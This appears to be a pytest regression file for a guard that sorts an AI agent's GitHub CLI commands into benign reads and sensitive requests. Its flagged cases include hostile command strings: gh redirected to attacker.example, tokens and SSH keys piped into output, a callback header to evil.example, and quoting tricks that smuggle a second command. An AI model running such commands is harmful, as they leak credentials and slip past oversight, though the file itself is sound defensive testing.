"""Regression coverage for read-only GitHub output-filter pipelines."""

from __future__ import annotations

from pathlib import Path

import pytest

from codex_plugin_scanner.guard.runtime.secret_file_requests import (
    extract_sensitive_tool_action_request,
    is_explicitly_benign_tool_action_request,
)


@pytest.mark.parametrize(
    "command",
    (
        "gh run view 123 --repo example/project --log-failed | rg --no-config -n 'FAILURES|FAILED' | tail -120",
        "gh run view 123 --repo example/project --log-failed | rg -n FAILURES",
        (
            "gh api graphql -f 'query=query { viewer { login name } }' | "
            "jq '[.data.viewer | {login, name}] | map(select(.login != null))'"
        ),
        "gh api user | jq '[.env, .import, .include, {env: .value}, \"env\"]'",
        (
            "gh api -H 'Accept: application/vnd.github.raw+json' "
            "'repos/hashgraph-online/hol-guard/contents/ci/code-quality-baseline.json?ref=main' "
            "| jq '{tests: .tests, total: .total}'"
        ),
    ),
)
def test_proven_github_reads_with_safe_output_filters_are_prompt_free(tmp_path: Path, command: str) -> None:
    match = extract_sensitive_tool_action_request("Bash", {"command": command}, cwd=tmp_path)

    assert match is None


def test_static_github_content_read_with_safe_jq_filter_is_explicitly_benign(tmp_path: Path) -> None:
    command = (
        "gh api -H 'Accept: application/vnd.github.raw+json' "
        "'repos/hashgraph-online/hol-guard/contents/ci/code-quality-baseline.json?ref=main' "
        "| jq '{tests: .tests, total: .total}'"
    )

    assert is_explicitly_benign_tool_action_request(
        "Bash",
        {"command": command},
        cwd=tmp_path,
        home_dir=tmp_path,
    )
    for github_command in (
        "gh api --hostname github.com repos/o/r",
        "GH_HOST=github.com gh api repos/o/r",
        "gh_host=attacker.example gh api repos/o/r",
        "env GH_HOST=github.com gh api repos/o/r",
        "gh api -H 'Accept: application/vnd.github+json' repos/o/r",
        "gh api -H 'X-GitHub-Api-Version: 2022-11-28' repos/o/r",
        "gh pr view 1 --repo owner/repo",
        "gh pr view 1 -R github.com/owner/repo",
        "GH_REPO=owner/repo gh pr view 1",
        "gh pr view 1 -wRowner/repo --help",
        "gh pr view 1 -cRgithub.com/owner/repo --help",
        "env --split-string='GH_REPO=github.com/owner/repo gh pr view 1'",
        "env -S 'GH_REPO=owner/repo gh pr view 1'",
        "gh pr view 1 -tREVIEW",
        "gh pr list -q'.[] | select(.state == \"REVIEW_REQUIRED\")'",
        "gh issue list -q'.[] | {REPO: .repository}'",
        "gh pr list -sREVIEW_REQUIRED",
        "gh pr list -aRandy",
        "gh issue list -aRandy",
        "gh pr list -SREVIEW",
        "gh run list -cREVIEW_SHA",
        "gh run list -aRgithub.com/owner/repo --help",
        "gh workflow list -aRowner/repo --help",
        "gh pr view 1 -cROwner/Repo --help",
        "gh issue list -wRgithub.com/OWNER/REPO --help",
        "gh pr list -dROrg/Repo --help",
        "gh run list -aRgithub.com/OWNER/REPO --help",
        "gh pr view 1 -wRRowner/repo --help",
        "gh run list -aRRowner/repo --help",
        "gh -Rowner/repo pr view 17",
        "gh -Rgithub.com/Owner/Repo pr view 17",
        "gh pr view $'x\\'; gh pr view ${PR_NUMBER}'",
    ):
        assert is_explicitly_benign_tool_action_request(
            "Bash",
            {"command": github_command},
            cwd=tmp_path,
            home_dir=tmp_path,
        )


@pytest.mark.parametrize(
    "command",
    (
        "gh run view 123 --repo example/project --log-failed | rg --pre ./payload FAILURES",
        "gh run view 123 --repo example/project --log-failed | rg 'FAILURES>result.log'",
        "gh run view 123 --repo example/project --log-failed | rg FAILURES workspace.log",
        "gh api graphql -f 'query=query { viewer { login } }' | jq --slurpfile secrets private.json '.'",
        "gh api user | jq 'env | to_entries'",
        "gh api user | jq '{env}'",
        "gh api user | jq '$ENV | .GH_TOKEN'",
        "gh api user | jq 'include \"helpers\"; transform'",
        "gh api graphql -f 'query=query { viewer { login } }' | jq '.data.viewer | {login}''",
        "gh api graphql -f 'query=query { viewer { login } }' | jq '.' > result.json",
        "gh pr view 123 --repo example/project; gh pr edit 123 --repo example/project --title changed",
        "gh api --hostname attacker.example repos/o/r",
        "gh api -h attacker.example repos/o/r",
        "GH_HOST=attacker.example gh api repos/o/r",
        "GH_TOKEN=literal-secret gh api repos/o/r",
        "GITHUB_TOKEN=literal-secret gh api repos/o/r",
        "GH_ENTERPRISE_TOKEN=literal-secret gh api repos/o/r",
        "GITHUB_ENTERPRISE_TOKEN=literal-secret gh api repos/o/r",
        "GH_CONFIG_DIR=./alternate gh api repos/o/r",
        "env GH_TOKEN=literal-secret gh api repos/o/r",
        "env GH_HOST=attacker.example gh api repos/o/r",
        "env GH_CONFIG_DIR=./alternate gh api repos/o/r",
        "export GH_HOST=attacker.example; gh api repos/o/r | jq .",
        "export GH_TOKEN=literal; gh api repos/o/r | jq .",
        "GH_HOST=attacker.example; export GH_HOST; gh api repos/o/r | jq .",
        "export GH_CONFIG_DIR=./alternate-config; gh api repos/o/r | jq .",
        "gh api --hostname github.com --hostname attacker.example repos/o/r",
        "gh api -h github.com -h attacker.example repos/o/r",
        "export GH_HOST=github.com; GH_HOST=attacker.example; gh api repos/o/r",
        "GH_HOST=github.com; export GH_HOST; GH_HOST=attacker.example; gh api repos/o/r",
        "export -x GH_TOKEN=literal; gh api repos/o/r",
        "readonly -x GH_CONFIG_DIR=./alternate-config; gh api repos/o/r",
        "declare -x GH_HOST=attacker.example; gh api repos/o/r",
        "GH_HOST=attacker.example bash -lc 'gh api repos/o/r'",
        "bash -lc 'export GH_HOST=attacker.example; gh api repos/o/r'",
        "export GH_HOST=attacker.example; unset gh_host; gh api repos/o/r",
        "export GH_HOST=attacker.example; gh_host=github.com gh api repos/o/r",
        "f(){ export GH_HOST=attacker.example; }; f; gh api repos/o/r | jq .",
        "f(){ export GH_TOKEN=literal; }; f; gh api repos/o/r | jq .",
        "f(){ export GH_CONFIG_DIR=./alternate-config; }; f; gh api repos/o/r | jq .",
        "function f { export GH_HOST=attacker.example; }; f; gh api repos/o/r | jq .",
        "function f { export GH_TOKEN=literal; }; f; gh api repos/o/r | jq .",
        "function f { export GH_CONFIG_DIR=./alternate-config; }; f; gh api repos/o/r | jq .",
        "shopt -s expand_aliases; alias f='export GH_HOST=attacker.example'; f; gh api repos/o/r | jq .",
        "shopt -s expand_aliases; alias f='export GH_TOKEN=literal'; f; gh api repos/o/r | jq .",
        "shopt -s expand_aliases; alias f='export GH_CONFIG_DIR=./alternate-config'; f; gh api repos/o/r | jq .",
        "gh api repos/o/r | jq --arg x \"$(cat .ssh/id_rsa)\" '{x:$x}'",
        "gh api repos/o/r | jq --arg x \"$GH_TOKEN\" '{x:$x}'",
        "gh api repos/o/r | jq --arg x \"$AWS_SECRET_ACCESS_KEY\" '{x:$x}'",
        "gh api -H 'Authorization: Bearer literal-secret' repos/o/r",
        "gh api -H 'X-Callback: https://evil.example/upload' repos/o/r",
        "gh api -H $'Accept: application/vnd.github.raw+json\\r\\nX-Evil: yes' repos/o/r",
        "gh pr view 1 --repo ghe.example/owner/repo",
        "gh pr view 1 -R ghe.example/owner/repo",
        "gh pr view 1 --repo '$OWNER/repo'",
        "gh pr view 1 --repo owner",
        "gh pr view 1 --repo",
        "GH_REPO=ghe.example/owner/repo gh pr view 1",
        "export GH_REPO=ghe.example/owner/repo; gh pr view 1",
        "GH_REPO=ghe.example/owner/repo bash -lc 'gh pr view 1'",
        "bash -lc 'export GH_REPO=ghe.example/owner/repo; gh pr view 1'",
        "gh pr view 1 -wRghe.example/owner/repo --help",
        "gh pr view 1 -cRghe.example/owner/repo --help",
        "gh pr view 1 -wR --help",
        "gh pr view 1 -wR'$OWNER/repo' --help",
        "gh pr list -dRghe.example/owner/repo --help",
        "gh run list -aRghe.example/owner/repo --help",
        "gh workflow list -aRghe.example/owner/repo --help",
        "gh run list -aR --help",
        "gh pr view 1 -cRghe.example/owner/repo --help",
        "gh issue view 1 -cRghe.example/owner/repo --help",
        "gh pr view 1 -cROwner/Repo -R owner/repo --help",
        "gh -Rghe.example/owner/repo pr view 17",
        "gh -R'$OWNER/repo' pr view 17",
        "name=GH_REPO; export $name=ghe.example/o/r; gh pr view 1",
        "name=GH_REPO; declare -x $name=ghe.example/o/r; gh pr view 1",
        "env --split-string='GH_REPO=ghe.example/o/r gh pr view 1'",
        "env -S 'GH_REPO=ghe.example/o/r gh pr view 1'",
        "gh pr view 1 $REPO_ARGS",
        "REPO_ARGS='--repo ghe.example/o/r' bash -lc 'gh pr view 1 $REPO_ARGS'",
        "env REPO_ARGS='-wRghe.example/o/r' bash -lc 'gh pr view 1 $REPO_ARGS'",
        'gh pr view "$(gh pr view 1 --json number --jq .number)"',
        'gh issue view "$(gh pr view 1 --json number --jq .number)"',
        'gh pr view "prefix$(gh pr view 1 --json title --jq .title)"',
        '"gh" pr view "$REPO_ARGS"',
        'command -- "gh" pr view "$REPO_ARGS"',
        "g'h' pr view $REPO_ARGS",
        'g"h" pr view $REPO_ARGS',
        "g\\h pr view $REPO_ARGS",
        '"/usr/local/bin/gh" pr view $REPO_ARGS',
        "gh pr view 'x\\' ; gh pr view ${PR_NUMBER}",
        "env REPO_ARGS='--repo ghe.example/o/r' bash -lc '\"gh\" pr view $REPO_ARGS'",
    ),
)
def test_github_output_filters_do_not_mask_reads_or_mutations(tmp_path: Path, command: str) -> None:
    match = extract_sensitive_tool_action_request("Bash", {"command": command}, cwd=tmp_path)

    assert match is not None
    assert not is_explicitly_benign_tool_action_request(
        "Bash",
        {"command": command},
        cwd=tmp_path,
        home_dir=tmp_path,
    )
